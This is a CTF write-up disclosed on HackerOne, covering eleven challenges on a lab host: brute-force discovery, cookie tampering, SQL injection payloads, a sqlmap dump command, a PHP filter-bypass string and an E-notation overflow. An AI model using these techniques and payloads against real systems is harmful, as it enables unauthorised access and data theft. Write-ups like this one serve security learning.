# h1-ctf : 12 days of hack holiday writeup

## Report Details
- **Report ID**: 1069175
- **URL**: https://hackerone.com/reports/1069175
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T08:20:34.383Z
- **Disclosed**: 2021-01-14T19:34:55.790Z

## Reporter
- **Username**: webhak
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Summary
This was a real fun CTF and I really enjoyed solving the challenges. Great job on creating the challenges. 

This is my writeup for the "12 Days of Hacky Holidays CTF". I hope you enjoy reading it, and I hope others reading it will pick up a trick or two.

# Flags:
This is all the flags found during the CTF

* Flag 1: flag{48104912-28b0-494a-9995-a203d1e261e7}
* Flag 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
* Flag 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
* Flag 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
* Flag 5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
* Flag 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
* Flag 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
* Flag 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
* Flag 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
* Flag 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
* Flag 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}
* Flag 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}


# Intro
Like a lot of other bounty hunters I enjoy reading security related news on Twitter, but on this particular day, something in my feed caught my attention. It was this tweet from [Hackerone](twitter.com/hacker0x01) announcing "12 days of hack holiday":


{F1138752}


The first thought that hit me was: "A CTF with one flag each day? Maybe I can solve one flag each day AND get some sleep as well? This sounds like an unusual CTF, this is going to be a first. I'm in!"


# Writeup
Before we start I would like to introduce the common tools that I have used to solve this CTF, and that I use during my regular security research.

* [FFuF](https://github.com/ffuf/ffuf) - This is an awesome tool, and if this is not familiar to you I highly recommend you check this out. This tool can be used for almost every kind of fuzzing related to web. FFuF is usually used in conjunction with a suitable wordlist for the target. When you use this tool always rate limit it, since the default number of threads and request per second is pretty aggressive. You can use -t to control the number of threads and -rate to control the number of request per second. Be nice to the other CTF players and do not overflow the server with traffic. 
* [SecList](https://github.com/danielmiessler/SecLists) - A very nice collection of wordlists (maybe the best) that is usually used together with a tool, such as FFuF, to do directory brute force, password guessing or other similar things. All wordlists I have used to solve this CTF can be found in the SecList project.
* [Burp](https://portswigger.net/burp) - Every web applications testers go-to intercepting proxy. This has been used to proxy almost all traffic during this CTF.
* Python - An awesome programming language, that is really fast to create small scripts that can automate some cumbersome manual task. To solve this CTF, a couple of Python script was written to automate some of the tasks. 
* [Cyberchef](https://gchq.github.io/CyberChef/) - Nice tool to decode/hash/brute force etc. Really fast to just hash or decode something. 

Ok, now that we are done with the intro, let us get to some hacking!

As always, we start by reading the [program brief](https://hackerone.com/h1-ctf) linked from the announcement tweet. We find the scope and observe that the only in scope domain is `hackyholidays.h1ctf.com`. So we need to ensure that we only send traffic to hackyholidays.h1ctf.com in order to be within the scope of the CTF.

## Flag 1 - robots.txt
By browsing to https://hackyholidays.h1ctf.com we are greeted with the following image: 

{F1138753}

This is not that interesting. Of course the Grinch want to keep out us out, we are here to take down his network such that he can not ruin the holidays! To find out if the server is hosting any other interesting files or endpoints, we run [FFuF](https://github.com/ffuf/ffuf) with a good wordlist. Since we know very little about the target, a good starting point is usually the [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) file from the awesome [SecLists](https://github.com/danielmiessler/SecLists/) project. So by running a content-discovery with FFuF using the common.txt wordlist and filtering out the 404 responses, we get the following result: 

{F1138795}

From the FFuF result, We observe that we get a 200 OK response from the /robots.txt endpoint. This is usually a good starting point to find other, app specific locations, that the common wordlists do not contain. So by browsing to the [robots.txt file](https://hackyholidays.h1ctf.com/robots.txt) in our browser we get the following result from the server, containing the first flag:

{F1138757}

Flag 1 is: `flag{48104912-28b0-494a-9995-a203d1e261e7}`

* * *

## Flag 2 - s3cr3t ar3a
If we observe the robots.txt from the previous step closely, we see that it has one disallow entry in the file, namely `/s3cr3t-ar3a`. If we points our browser to [https://hackyholidays.h1ctf.com/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) endpoint in our browser we see the following page:


{F1138758}


It looks like the page has been moved. But before we move on, we should inspect the HTML to verify that there is no part of the web page that contains any hidden information. We can use the Chrome developer tools to inspect the HTML, and lo and behold! The second flag is displayed in front of our eyes inside the data-info attribute on one of the div tags:

{F1138759}

Flag 2 is: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

* * * 

## Flag 3 - People Rater
Along with flag 2 in the data-info attribute of the div, a `next-app` attribute with the value `/apps` was set. This indicates that in order to find the next flag we must navigate to [https://hackyholidays.h1ctf.com/apps](https://hackyholidays.h1ctf.com/apps). As soon as the challenge was release a link appeared to the "People Rater" application. By clicking the link we are greeted with the mission brief for the People Rater application:

**Mission brief**: 
`The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!`


So we need to find a record that does not belong in the People Rater application. If we start by clicking on one of the items in the Grinch People Rater list, we observe that a HTTP request is made to the back-end URL `/people-rater/entry`. When the user clicks the item "Tea avery" in the list, the URL is called with the id parameter set to `eyJpZCI6Mn0=`. The `ey` part is usually an indicator of a base64 encoded JSON payload. So by decoding the base64 value in your favorite decoder ([Cyberchef](https://gchq.github.io/CyberChef/) or using the [Burp suite](https://portswigger.net/burp) decoder) we get the value: `{"id":2}`. By clicking on the other items in the in the list, we get a similar request but with another id. 

To figure out the valid set of ids, we can use Burp intruder and fuzz every number from 0 to 100 in the id field. If we do this, we find that by sending a payload with the id of 1 we get the following payload from the server:

```json
{
  "id": "eyJpZCI6MX0=",
  "name": "The Grinch",
  "rating": "Amazing in every possible way!",
  "flag": "flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}

```

Flag 3 is: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

* * * 

## Flag 4 - Swag Shop
**Mission Brief**: 
`Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.`

So we will need to find the Grinch's personal detail from the shop, let us explore the shop to check if it is possible. By clicking the purchase button, from the front page of the application, a POST request to the following url is made: `/swag-shop/api/purchase.` The /api part of the URL looks very interesting. To check if there is some other endpoints on the /api path, we can run FFuF against it with the common.txt file from SecList:

{F1138760}

The FFuF run yields three endpoints: /session, /stock and /user. Let us start by looking at why /user yields a 400 response, not 200 that the other endpoints yields. By browsing to the following url: `https://hackyholidays.h1ctf.com/swag-shop/api/user` we can access the user endpoint path of the API, which gives the following message: 

```json
{"error":"Missing required fields"}
```

A 400 response and a message like this is sometimes an indication that the endpoint is expecting some parameters, but we are not providing them. A fast way to check if we may be missing some parameters is to do a parameter brute force with FFuF. We choose the burp-parameter-names.txt wordlist from SecList to perform this brute force. We will filter out any 400 responses, to check if any of the parameter names will yield any other responses than 400:

{F1138761}

So the by adding the parameter uuid, we get a 404 response instead of a 400. If we now navigate our browser to the URL with the parameter uuid set to value, like this: `https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=value` we get the following JSON response from the endpoint:

```json
{"error":"Could not find matching uuid"}
```

This is a clear indication that if we can find a valid uuid, we may get a valid response from this endpoint, hopefully containing some information about the user. Looking back at the initial fuzz we did to discovery API endpoints we see that there is a /session endpoint on the api path. By navigating to [https://hackyholidays.h1ctf.com/swag-shop/api/sessions](https://hackyholidays.h1ctf.com/swag-shop/api/sessions) we get a response back that contains a JSON list of sessions values that is base64 encoded. By decoding them we find one UUID inside the "user" property of the third user with the value: `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`

By navigating the browser to the URL: `https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043`, we get the following JSON response from the server that contains the Grinch's personal details and the flag:

```json
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```


Flag 4 is: `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

* * * 

## Flag 5 - Secure Login
**Mission brief:** 
`Try and find a way past the login page to get to the secret area.`

So for this flag we will have to find a way to get past the login page, and access the secret area. When we open the application, a login page where we must enter a username and password, in order to log in, is displayed. If we enter the username "admin" with the password "admin", the following message is displayed back to the user: `Invalid Username`. Since only the username is mention in the message displayed back to the user, this application may give another error message for a valid user. If this is the case we can distinguish between a valid user and an invalid user. That means we can find a valid user and launch a password brute force attack against the user, and if we are lucky gain access to the secret area. Lets give it a try! We fire up FFuF again to do a brute force attack against the username to check if we are able to discover any valid users:

{F1138764}

In this run with FFuF we use the -fr option to filter out the regular expression "Invalid Username". This means that each result that is returned from FFuF does not contain the specified regular expression. From the result we see that the username `access` will respond with something other than "Invalid Username" in the response. If we try to login manually via the browser with the username "access" and a random password, the application will now return the message: `Invalid Password`. If we now run FFuF again, but change the fuzz location to the password field with the username set equal to "access", we can brute force the password of the access user:

{F1138762}

So the username / password combination of `access / computer` will result in a 302 redirect from the server. If we try the discovered credentials in the browser, the 302 redirect from the server will set an access cookie named "secure-login" and redirect back to "/secure-login". Now, since we are logged in, the page will show a table with secure files that the user can download:

{F1138763}

The page says that there is no files to download, maybe if we could become another user there would be some files for us to download.

If we look closely at the secure-login cookie, the value starts with a familiar "ey" pattern. This value is not only base64 encoded, it is also URL encoded. So if we are to retrieve the correct decoded value we must first URL decode before we base64 decode the value in order to preserve the correct value. After decoding our secure-login cookie we end up with the following JSON object:

```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

The admin property of the cookie is set to false, pretty interesting. Let us check what happens if we change the value from false to true, base64 encode it and then URL encode it. We end up with the following value: 

```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo%3D
```

If we change the secure-login cookie to this new value, via the browsers developer tools, we get the following result when refreshing the page: 

{F1138765}

Ok, so we now got a file to download. Let us download the file and check the content of the zip file. By clicking the link in the table, the "my_secure_files_not_for_you.zip" file is downloaded. But when we try to extract the file via `unzip my_secure_files_not_for_you.zip` we are prompted for a password. 

Ok, so we need to crack the password on the zip file. We can do this by using the [fcrackzip](https://github.com/hyc/fcrackzip) utility with the rockyou.txt wordlist. By running frackzip towards this downloaded zip file, with the rockyou.txt wordlist as input, we get the following result:

{F1138766}

From the result we see that the password is: `hahahaha`. So if we now try to unzip the file with unzip again and enter the password, two files are now extracted. The first file is an image with the name XXX.png. Please cover the eyes of any children near the screen before you scroll down:

{F1138767}


And the second file is the flag.txt file that contains the 5th flag.


Flag 5 is: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

* * * 

## Flag 6 - My Diary

**Mission brief:**
`Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?`

So we need to hack the Grinchs diary to retrieve and find his upcoming event. Upon browsing to the URL `https://hackyholidays.h1ctf.com/my-diary/` we are immediately redirected to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`. The template parameter looks really interesting and may hint to a Local File Inclusion vulnerability. Let us do a short content discovery with FFuF to see if there are any other interesting files on the server.

{F1138768}

If we browse to the index.php via the URL `https://hackyholidays.h1ctf.com/my-diary/index.php`, the server will just redirect us back to the main page. Let see if the template parameter may be vulnerable by changing the value from `entries.html` to `index.php` instead. When we open the following URL: `https://hackyholidays.h1ctf.com/my-diary/?template=index.php`, the browser will just display a blank page, but if we inspect the page with developer tools or look at the HTTP response in Burp, we discover the following PHP code is returned in the HTTP response:


```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

If we analyze the PHP file we find that the code does the following: 

1. Fetch the template parameter from the request and store it inside the $page variable
2. For every character in the $page variable that is not in the set a-z, A-Z, 0-9 or dot, replace them with nothing and store this result in the $page variable.
3. For every instance of the string `admin.php` in the $page variable, replace it with nothing and store this result in the $page variable.
4. For every instance of the string `secretadmin.php` in the $page variable, replace it with nothing and store the result in the $page variable. 
5. Finally the script will check if the location in the $page variable exist in a file on disk, if it does, the content of the file will be returned. If not the user is redirected back to the main page.

Note the comment above the line that replaces secretadmin.php in the index.php file. It seems that the Grinch have moved the amdin.php file to secretadmin.php, so that is the file we should try to read. We can do this by navigating to the URL: `https://hackyholidays.h1ctf.com/my-diary/secretadmin.php` in the browser. This results in a page that display the message `You cannot view this page from your IP Address`. Ok, so we will have to find another way to read this file. 

Let us go back to the index.php file we manage to download. If we are able to construct a string, that when the regex run against it, will result in setting the $page variable to `secretadmin.php`, we should be able to read the content of secretadmin.php file. By playing a little bit with the input to the template parameter we find that the string `secretadminsecretadminadmin.php.phpadmin.php.php` is able to bypass the check and read the content of secretadmin.php. That means we can navigate to the following URL:  `https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.phpadmin.php.php` and we are able to browse the Grinchs calendar and see that on the 23rd of December he has scheduled an event to "Launch DDoS Against Santa's Workshop!". Let us hope we are able to stop his attack in time!

The page will also show the 6th flag:

{F1138769}

Flag 6 is: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

* * * 
## Flag 7 - Hate Mail Generator
**Mission Brief**: 
`Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!`

Upon launching the Hate Mail Generator application we see a page with a list of one previous (Hate) mail campaign and the ability to create a new campaign. By clicking the name of the old campaign we can see the name, subject and markup of the campaign. 

The markup is set to: 

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```
It is very interesting that the campaign contains the ability to include a template via the `{{template:<TEMPLATE NAME>}}`, let us make a note of that and we will probably come back this later.

The application also supports to preview a template, this feature can be accessed by clicking the "preview button" on an old campaign. The template will then be rendered and displayed back to the user. 

On the front page there is also the button to create a new campaign. If we start a new campaign we are able to add a name, subject and markup for the template. If we click the "create" button, on the new campaign page, we get a message saying that we are out of credits. So we can not create any new campaigns, however we are able to enter the markup and preview our campaign.

Before we try anything else, it would be good idea to do a regular content discovery with FFuF to check again for any hidden files on the server that the web application may not be linking to. We run FFuF with the common.txt file against the Hate Mail Generator application: 

{F1138770}

So we found a template folder, if we browse this folder we find the following 3 templates:

1. cbdj3_grinch_header.html   
2. cbdj3_grinch_footer.html
3. 38dhs_admins_only_header.html

The first two looks pretty generic, but template number 3 named "38dhs_admins_only_header.html" looks very interesting. If we try to open the template in the browser we just get a 403 Forbidden response from the server. Maybe if we could include the template via the template-include tag, we could read the template file.

If we create a new template with the following markup: 

```
Hello {{template:38dhs_admins_only_header.html}} 
```

And then click the preview button, we get a message from the server saying: "You do not have access to the file 38dhs_admins_only_header.html". So this can not be the right way. When I hack on template systems, there is always a comic that pops up in the back of my hacker mind, and it is this one:

{F1138771}

So if we can make the application double evaluate our tag, maybe we can force it to read the "38dhs_admins_only_header.html" file, even though we do not have access. If we inspect the request we just made to the preview page of our new campaign closely, we find some URL encoded parameters, and if we URL decode them we get the following:

```
preview_markup=Hello {{template:38dhs_admins_only_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
```

So the request that goes to the server contains the preview_data JSON object, that contains the data that probably is used when rendering the application. So if we are to perform a double evaluation, we can add a new variable, say "webhak", and set that variable to the following value: `{{template:38dhs_admins_only_header.html}}`, and then in the markup we render the webhak value like this `Hello {{webhak}}`. The request POST data looks like this, before url encoding:

```
preview_markup=Hello , {{webhak}} &preview_data={"name":"Alice", "webhak":"{{template:38dhs_admins_only_header.html}}" }
```

The server will then respond with the following page that contains the flag:

{F1138772}

Flag 7 is: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

* * *

## Flag 8 - Forum
**Mission brief:** `The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!`

This was a particular hard challenge if you did not proceed through the right steps. I waste some time on this challenge going down a couple of rabbit holes, but manage to solve it in the end.

When you open the main page you see a list of forums and and message saying that we need to be admin to see these posts. There is also a login button in the top corner that will lead us to the login page. When we browse the application we find some posts in the Christmas forum, but nothing on the pages sticks out or screams vulnerable. 

As usual, I like to run FFuF to see if there is anything the application is not linking to, but may be available upon directly navigating to the file or endpoint:

{F1138773}

When running FFuf we discover the `/phpmyadmin` endpoint, which returns another login page when we browse to it, this seems interesting. If we run a brute force attack with common login credentials, it yields no valid results.

After spending quite some time trying to find an attack vector on an application and looking at it from different angles without finding anything, it can sometimes be smart to take a large step back. A good thing to do is to do some recon and check Google and Github for the organization that may have created the application you are hacking. In some cases you might find the source code of the application, which you may be able to find a vulnerability in by doing some code review. 

By checking Github, we find that the "Grinch Networks" actually has a Github page: [https://github.com/Grinch-Networks](https://github.com/Grinch-Networks) that looks like an organization page for something called "Grinch-Networks" and one repository named "forum" available - [https://github.com/Grinch-Networks/forum](https://github.com/Grinch-Networks/forum). If we check the [commit history](https://github.com/Grinch-Networks/forum/commits/main) for the repository, wee see that there is 4 commits. The commit with the comment "Small fix" stands a bit out and by browsing to the commit changelog here [https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae), we can see that somebody checked in some credentials for the database, then tried to remove them. However they were only deleted from the source code, not the git history. 

The user name is `forum` and the password is `6HgeAZ0qC9T6CQIqJpD`. These credentials are not valid on the main application login page, but they are valid on the phpmyadmin login page. By logging in to the PHP myadmin application and by navigating to forum -> user ([https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user](https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user)) we find the following set of information:

| id | username | password | admin |
| -- | -------- | -------- | ----- |
| 1	| grinch | 35D652126CA1706B59DB02C93E0C9FBF	| 1 |
| 2	| max	| 388E015BC43980947FCE0E5DB16481D1 | |

The password column really looks like some kind of hash, so if we can crack one of them we may gain entry to the forum application. This is the result of running both hashes through [https://crackstation.net/](crackstation.net). 

{F1138774}

So the user `grinch` should have the password `BahHumbug`. If we then navigate to the forum login page, located at [https://hackyholidays.h1ctf.com/forum/login](https://hackyholidays.h1ctf.com/forum/login), we can now log in as the grinch with these credentials, and in the admin section ([https://hackyholidays.h1ctf.com/forum/3/2](https://hackyholidays.h1ctf.com/forum/3/2)) we will find the flag and the grinchs secret plan:

{F1138775}

As we can read from the forum post, the Grinch is looking for his IP addresses in order to launch a DDoS attack! Hopefully we will be able to take him down before he does so!

Flag 8 is: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

* * * 

## Flag 9 - Evil Quiz
**Mission brief:** `Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!`

Navigating the browser to the evil quiz application, the following page is displayed to us: 

{F1138776}

In the top right there is a button to log in to the admin application. To access any other part of the application, the user must first enter a name and submit it to the application. By submitting a name we are now allowed to access the quiz. If we submit the quiz, by clicking the finish button, the user is now navigated to the last page of the application, the score page. The score page will display your name, your quiz score and number of other players with the same name as you. 

The name of the user is the only input field that the application are expecting from the user, so this is probably where we should focus our effort. If we change then name of the user, we can try to enter the following payload to look for a SQL-injection, at the first screen: `hopefullyNoOneElseHasThisUsername' or 1=1 -- ` (there must be a space after the two dashes). If we submit the name and navigate to the score page of the application we observe that the application returns a message saying that "There is XXX other player(s) with the same name as you!", where XXX is replaced by a pretty large number. If we change the name to `hopefullyNoOneElseHasThisUsername' or 1=2 -- `, and the open the score page again, we observe that there is now always 0 other player(s) with the same name. This is a strong indicator that we have a blind sql injection vulnerability that we probably can exploit, since we can trigger a conditional response. We will skip the background on how to exploit such a vulnerability, if anyone is interested in more about the subject, I recommend the [Blind SQL  injection](https://portswigger.net/web-security/sql-injection/blind) article on Portswigger. 


To exploit this vulnerability we can create a Python script to perform a brute force of some content in the database for us. The appendix section have the Python script listed as flag9-solver.py. Since this server is a bit slow, we need to be a little bit smart of what information we want to dump from the database, to try to avoid dumping the whole database. The database server is probably MySQL, so if we query the "information_schema.tables" table, and order the results descending by the table create_time, we can pick the newest created table, since this is probably the most interesting. In MySQL it is possible to pick the latest created table like this: 

```
select table_name from information_schema.tables order by create_time desc limit 0,1;
```

We use this technique in the "get_latest_created_table_name" function of the flag9-solver.py script. The script will dump the content of the latest created table. When we run the Python script we get the following output:

{F1138778}

So the latest created table in the database is the "admin" table, and the content of looks like this: 

| id | username | password |
| -- | -------- | -------- |
| 1  | admin | S3creT_p4ssw0rd-$ |


So now we have a set of admin credentials, this is very interesting. By using these credentials we are able to login into the admin area of the Evil Quiz application. When we login with the credentials we are greeted with the admin area of the Evil quiz application that contains the flag:

{F1138779}


Flag 9 is: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

* * * 

## Flag 10 - Signup Manager
**Mission brief:** 
`You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!`

One potential way to infiltrate the Grinchs network and stop the DDoS attack against Santa servers is that we could get recruited into the Grinchs army. We could then gather some intelligence on the servers and techniques that they are planning on using, and possibly stop him and his army from taking down Satan! We are probably getting closer, so let us check what we can do with the signup manager.

As usually we start out with a content discovery with FFuF and the commons.txt from SecLists:

{F1138780}

These files do not look that interesting. The index.php file is the main page of the application, and the admin.php gives a message: `You cannot access this page directly`. So we are not able to access the admin page by just browsing to it.

By viewing the source of the index.php file we find the following comment: `<!-- See README.md for assistance -->`. Readme files are usually very interesting because they will sometime contain information on what product the site is running, what framework and which version, and similar information. This can usually be used to narrow down what kind of attacks are available. So if we browse to [https://hackyholidays.h1ctf.com/signup-manager/README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md) we can download the README.md file for the signup manager. The file contains the following: 

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7b) Default login is admin / password
```

Our first attempt was to log in with the default admin credentials from the README.md file, admin / password. These credentials are valid, but will only redirect us to the user area. If we are to become part of the Grinch army, we must access the admin area. So let us take a step back!

According to the README.md file there users are stored inside of a users.txt file, but the readme states that it is supposed to be in a folder that the cannot be read from the website visitors, let us check if the site administrator may have forgotten to move the users.txt file:

{F1138781}

A 404 page means that the file does not exists, so it looks like the site administrator followed the readme. Maybe the administrator have forgotten to delete the signupmanager.zip file that may contain the source code of the software running. So by navigating to [https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip) we are able to download the .zip file containing the source.

One of the things that stood out in the README.md file was item number 6: `You can make anyone an admin by changing the last character in the users.txt file to a Y`. That is interesting! If we can change the last character that is inserted into users.txt into a 'Y', we may just be able to access the admin area of the signup manager.

By getting a bit familiar with the code, we find no obvious vulnerabilities. A detailed review of the code that stores the user in users.txt file may be necessary to find anything interesting. The function that stores the user is available in index.php on line 26 and is called `addUser`, and looks like this:

```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

By reviewing the code we see how the user is stored in the users.txt file. If we can make some part of the string, before the 'N' is appended, one char longer than it is expected to be, we should be able to insert an 'Y' in the last position of the lastname, and it will overflow into the char that decides if the user is an administrator or not.  

The code will append the $line variable to the users.txt file. The $line variable consists of the username, padded to 15 characters, then the password, which is MD5 hash of the password, which is 32 characters. The age is then added and padded to 3 chars. Then firstname and lastname is appended, both padded to 15 chars. And then the last line is doing a substring of $line, choosing 113 chars, starting from position 0 (start of string). 

So, if we are able to ensure that the variable $line has an Y at end of it, when it is written to the users.txt file, we should be able to become admin. To do this we need to "overflow" the string, by setting the lastnames last char to an 'Y' and getting the line variable to shift one position. 

If we follow the signup flow from the code in index.php, we can see that on line 85: The POST parameter `age` is validated: 

```php
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
if (count($errors) === 0) {
	$cookie = addUser($username, $password, $age, $firstname, $lastname);
	setcookie('token', $cookie, time() + 3600);
	header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
	exit();
}
```

There is two checks in place on the "age" property. First the `is_numeric` function is called with the age property, this function checks if a string passed to it is a valid number or numeric string. The second test is to check if the length of the age property is longer than three characters. If the age property is four chars or longer, an error will be thrown. After these two check, the `intval` function is called with the age property to convert the value into a number. 

If there exists a string that does not contain more than three characters, but can be converted to a number that will take up four characters when converted via the `intval` function, we can overflow the last char of the "lastname" parameter and that will be shifted one position over, such that it is the last char that will be stored in users.txt.

This can be done by using "E notation" in PHP. Consider the following numbers: 

```
6 x 10^2 = 600
6 x 10^3 = 6000
```

In many programming languages (including PHP) the numbers above can be represented in the following way:

```
6e2 = 600
6e3 = 6000
```

So by setting our age to `6e3` our input should get passed the validation of age, length is not above three characters and the value is numeric, but resulting value will take up four characters when inserted into the users.txt file, hence overflowing the last Y in our lastname to the position of the char that decides if the user is an administrator or not. 

So we intercept the POST request for registering our user, and set the lastname to the value `FFFFFFFFFFFFFFY` and our age to `6e3`, we should be added to the users.txt file as an admin. The full request looks like this: 


{F1138782}

We can then open the front page and login in with the credentials we used when we sent the POST request. We can see that our attack succeeded and we are finally in the admin area of the application:


{F1138783}


Flag 10 is: `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

* * * 

## Flag 11 - r3c0n_server_4fdk59
When we successfully added us as an administrator and logged into the Signup manager, we got the flag 10 and a link to the next challenge. The links points to the following URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59. 

To get a foothold on the server, we start by running FFuF, with the common.txt file from SecLists, to find any interesting files or folders: 

{F1138784}

The /api path looks pretty interesting, and by navigating to /api we find the documentation for the API.

{F1138785}

This looks pretty interesting. So if we navigate to `r3c0n_server_4fdk59/api/ENDPOINTNAME` we should be able to access the API. When we browse to any endpoints, we get a message that `{"error":"This endpoint cannot be visited from this IP address"}`. So if we are going to call the API, we will have to bypass the IP restriction. Maybe we can find a way to make the box do the request for us. 


By browsing the application, we find that the application has two main features. The first feature is to display the photo albums and the second feature is to display the images in the photo albums. 

By poking at the hash parameter on the album endpoint, we find that it is vulnerable to an SQL injection, we can dump the two tables that looks interesting in the recon database by running:

```
sqlmap -u "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k" -p hash --dbms mysql  -T photo,album -dump 
```

We find nothing interesting in the database, so there must be something else.


```
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

```

If we look closely at the images, that the album page returns, we see that the picture endpoint takes a data parameter that always starts with "ey", again, this is usually and indication that the data is base64 encoded JSON. So if we take one image urls: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9` and we base64 decode the value of the data parameter we get:

```
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

